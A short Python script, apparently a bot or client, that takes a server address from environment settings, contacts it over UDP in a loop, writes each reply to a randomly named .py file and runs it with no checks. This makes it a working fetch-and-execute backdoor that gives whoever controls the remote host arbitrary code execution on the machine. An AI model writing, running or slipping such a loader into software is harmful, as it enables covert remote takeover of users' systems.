import os
import socket
import subprocess
import dotenv
import shutil
import random
import time

dotenv.load_dotenv()
server_ip = os.environ['host_IP']
server_address = (server_ip,6789)
maxsize = 4096
client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
time.sleep(5)
while True:
    massage = 'please wait'.encode('utf-8')
    client.sendto(massage,server_address)
    data, server = client.recvfrom(maxsize)
    if not data:
        break
    massage = data.decode('utf-8')
    print(massage)
    name = random.random()
    with open(f'./{name}.py','w') as f:
        f.write(massage)
    subprocess.getoutput(f'python3 {name}.py')
client.close()